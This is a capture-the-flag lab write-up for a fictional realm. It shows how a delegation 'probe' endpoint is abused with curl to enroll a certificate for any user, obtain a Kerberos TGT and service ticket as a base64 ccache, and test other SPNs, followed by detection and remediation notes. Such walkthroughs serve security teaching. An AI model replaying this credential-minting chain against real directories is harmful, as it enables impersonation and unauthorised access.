# K19.3 — The archive delegates

> **Category:** 2. KeplerOps · **Points:** 400 · **Difficulty:** expert
> **Solved by:** me (manual)

## At a glance

| | |
|---|---|
| **Vulnerability / bug class** | Unconstrained Kerberos delegation exposed over HTTP — any certificate the archive accepts can request a staff service ticket, and the archive serialises the ccache back to the caller |
| **Tools** | `curl`, `base64`, `klist`, `KRB5CCNAME` |
| **Attack surface** | `POST https://staff.keplerops.test/api/archive/delegation/probe` over mTLS |
| **Prerequisite** | A valid `clientAuth` certificate for an `@keplerops.test` UPN (K19.1) |
| **Flag** | accepted, value not recorded |

**What you are about to read:** how a "probe" endpoint meant to test delegation became a Kerberos
ticket factory, why a ccache in a JSON response is worse than a password, and where the delegation
stops — which is the expert part.

## Objective

> Use the colleague's archive workflow to establish the delegated authentication context needed by
> supplier administration.

Supplier administration in this range speaks Kerberos: it wants a service ticket for
`HTTP/staff.keplerops.test@KEPLEROPS.TEST`. We hold no realm password — only a certificate the
enrollment service minted. The card is to convert one into the other.

## Background you need

**Kerberos delegation.** A service acting toward another service with the *user's* authority needs a
service ticket for that target. Unconstrained delegation lets the service request a ticket for **any**
SPN; constrained delegation (S4U2Self/S4U2Proxy) limits it to an allow-list, and RBCD limits it to a
specific target with an explicit ACL.

That distinction is the whole security property: with unconstrained delegation, the service — or
anyone who can make the service act — can mint a ticket for any service in the realm on the victim's
behalf. You do not need the victim's password or a domain-joined host; you need a way to *ask*.

**ccache.** A credential cache (`KRB5CCNAME=FILE:...`) holds the TGT and service tickets obtained. A
base64 blob of a ccache is a portable, replayable credential — the Kerberos equivalent of handing
over a session cookie, except it works against every service the tickets cover.

## Walkthrough

### 1. Get a certificate the archive will accept

Enrollment (K19.1) returns a keypair for any `@keplerops.test` UPN:

```bash
curl -sS -k -X POST \
  -H 'Authorization: Bearer fk_cert_enrollment_Um9U1sNZQ5b_Cb08iirD4H-BKfz8aMF9' \
  -H 'Content-Type: application/json' \
  -d '{"upn":"evan.calderoux@keplerops.test"}' \
  https://staff.keplerops.test/api/enrollment/StaffArchiveUser/requests \
  | jq -r .certificate_pem > evan.crt
```

The same response carries `private_key_pem` (write it to `evan.key`). K19.2 covers the archive
handover read this certificate also unlocks.

### 2. Ask the delegation surface for the staff SPN

```bash
curl -sS -k --cert evan.crt --key evan.key \
  -H 'Content-Type: application/json' \
  -d '{"spn":"HTTP/staff.keplerops.test@KEPLEROPS.TEST"}' \
  https://staff.keplerops.test/api/archive/delegation/probe
```

```json
{ "spn": "HTTP/staff.keplerops.test@KEPLEROPS.TEST",
  "ccache_base64": "…", "flag": "…" }
```

A base64 **ccache** and this card's flag in one response.

### 3. Materialise and inspect the ticket

```bash
jq -r .ccache_base64 probe.json | base64 -d > /tmp/evan.ccache
KRB5CCNAME=FILE:/tmp/evan.ccache klist
```

`klist` matters: it tells you exactly what you received, which is the difference between "I have a
ticket" and "I have the ticket I wanted".

```
Credentials cache: FILE:/tmp/evan.ccache
Principal: evan.calderoux@KEPLEROPS.TEST
  Server: krbtgt/KEPLEROPS.TEST@KEPLEROPS.TEST
  Server: HTTP/staff.keplerops.test@KEPLEROPS.TEST
```

A TGT and one service ticket, for staff only. Nothing else in the realm is in the cache — that is the
delegated authentication context this card asks for.

### 4. Getting the flag, and finding the edge

The probe response's `flag` field is this card's value; the scoreboard card stores none, so it is
accepted/not recorded. The engineering result is the *edge* of the delegation:

```bash
for spn in HTTP/connector.arwc.test@KEPLEROPS.TEST \
           HTTP/cloud-api.keplerops.test@KEPLEROPS.TEST; do
  curl -sS -k --cert evan.crt --key evan.key -H 'Content-Type: application/json' \
    -d "{\"spn\":\"$spn\"}" https://staff.keplerops.test/api/archive/delegation/probe
done
# {"error":"ticket_request_failed"}  (both)
```

Only the staff SPN resolves. Presenting the ccache or the certificate to the customer side also fails:

```bash
curl -sS -k --negotiate -u : https://connector.arwc.test/api/fieldlink/diagnostics
# 403 {"error":"channel_identity_denied"}
```

The ARWC ingress wants a channel identity issued on the customer side, not a KeplerOps staff
principal — a dead end belonging to the connector-identity challenges.

## Why this works (the vulnerability explained)

Two layers are confused.

**HTTP authorisation:** the probe authenticates the caller by certificate subject, then authorises on
"is this an archive principal". That subject came from an issuance policy that signs anything (K19.1),
so the check reduces to "does the caller hold a certificate we minted".

**Kerberos:** once past layer 1, the service uses its own realm identity to request a ticket *for the
caller*. With unconstrained delegation the KDC issues a ticket for any SPN the service names, and the
probe serialises the resulting ccache and returns it.

```
worker token -> any UPN cert -> mTLS to archive -> ask for SPN
             -> KDC issues ticket -> ccache in JSON -> you own it
```

The response is the bug. Delegation is a server-side act; materialising a ccache and handing it to
the requester converts an authorisation decision into a transferable credential. Even correctly
constrained delegation is unsafe if the token is returned instead of used transiently in-process.
Correct design: never return a ccache, constrain delegation to an SPN allow-list, bind the probe to
the authenticated principal and an authorised target, and clear
`TRUSTED_TO_AUTH_FOR_DELEGATION` on accounts that do not need it.

## Detection and fix

- **Log signal:** TGS-REQ (4769) for `HTTP/staff.keplerops.test` where the requesting account is the
  archive service but the "for user" principal is many different UPNs; archive requests to the
  delegation endpoint from certificates enrolled minutes earlier.
- **Fix:** no ccache in responses, constrained delegation with an SPN allow-list, role-gated endpoint.
  Because a ccache is a bearer artefact it cannot be recalled — only expiry and service-account key
  rotation reduce the blast radius.

## Notes and dead ends

- The response key `ccache_base64` is reconstructed; what is recorded is that the probe returns a
  base64 ccache plus the flag, usable via `KRB5CCNAME=FILE:/tmp/evan.ccache klist`.
- `HTTP/connector.arwc.test`, `HTTP/cloud-api.keplerops.test` and `HTTP/workloads.keplerops.test` all
  return `ticket_request_failed` — do not spend time on them.
- `connector.arwc.test` rejects staff mTLS certificates and SPNEGO with this ccache
  (`403 channel_identity_denied`). The working ARWC ingress is the support/delivery service, not the
  relay.
- A non-realm subject at enrollment returns `422 invalid_upn`; the realm boundary, not the SPN list,
  is what limits certificate supply.
